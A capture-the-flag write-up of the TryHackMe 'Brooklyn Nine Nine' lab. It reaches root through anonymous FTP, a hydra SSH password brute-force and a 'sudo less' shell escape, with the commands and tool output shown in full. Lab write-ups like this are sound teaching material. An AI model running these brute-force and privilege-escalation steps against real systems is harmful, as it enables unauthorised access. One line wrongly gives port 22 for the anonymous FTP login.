---
title: "THM - Brooklyn Nine Nine"
author: NiBi
lang: "en"
categories : ['Try Hack Me']
tags : ['CTF', 'THM','sudo','easy']
titlepage: true
toc: true
toc-own-page: true
---


# Information Gathering

## Nmap

We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 11:38 EDT
Nmap scan report for 10.10.112.101
Host is up (0.079s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.80.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
```

Here, we notice that ports **21**,**22**,**80** are open.

Thanks to Nmap, we find that port 22 with anonymous login is enabled.

## FTP Anonymous login

Let's connect anonymously to the server. Use "anonymous" as user and leave the password field blank.

```shell

Connected to 10.10.112.101.
220 (vsFTPd 3.0.3)
Name (10.10.112.101:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||59205|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
```

A "note_to_jake.txt" is here.

Inside we found :

```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Let's put aside the usernames "jake" and "amy".
Maybe we can bruteforce Jake's password later.

## Port 80

On the main page we just have a picture. We can go further with dirsearch, we may be lucky to find hidden directories.

```shell

 dirsearch -u http://10.10.112.101          

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )
                                                                                                                                                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.112.101/_22-05-31_11-56-16.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-05-31_11-56-16.log

Target: http://10.10.112.101/
[11:57:00] 200 -  718B  - /index.html                                       
[11:57:22] 403 -  278B  - /server-status/                                   
[11:57:23] 403 -  278B  - /server-status          


```

Bad luck ! We do not find anything special.
We know that Jake has a weak password, maybe we can just try to bruteforce his ssh password.

## Is Jake password really weak ?

Let's use hydra to bruteforce jake's password.

```shell

$ hydra -s 22 -l jake -P /usr/share/wordlists/rockyou.txt -t 16 10.10.112.101 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-31 12:07:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.112.101:22/
[22][ssh] host: 10.10.112.101   login: jake   password: [REDACTED]
```

Done ! Jack has a really weak password...

# Privesc

## Moove to SSH & User flag (also root)

```shell

└─$ ssh jake@10.10.112.101    
The authenticity of host '10.10.112.101 (10.10.112.101)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:18: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.112.101' (ED25519) to the list of known hosts.
jake@10.10.112.101's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$

```

Connected !

The 4 first things to try for privilege escalation in my opinion:

* Sudo -l
* Crontab
* SUID
* Write access

The **sudo -l** output is pretty useful.

```shell
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

We can run **less** as any user without any password...

When i want to exploit binaries i moove to <https://gtfobins.github.io/gtfobins/less/>

Written in the Sudo section  :

```shell
sudo less /etc/profile
!/bin/sh
```

So we can open shell with less.
By executing these commands we get root and we can have flags:

```shell

jake@brookly_nine_nine:~$ sudo less /etc/profile
# whoami
root
# cat /home/holt/user.txt && cat /root/root.txt
[REDACTED]
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [REDACTED]

Enjoy!!
```

## Conclusion

Very easy one but quite interesting :)
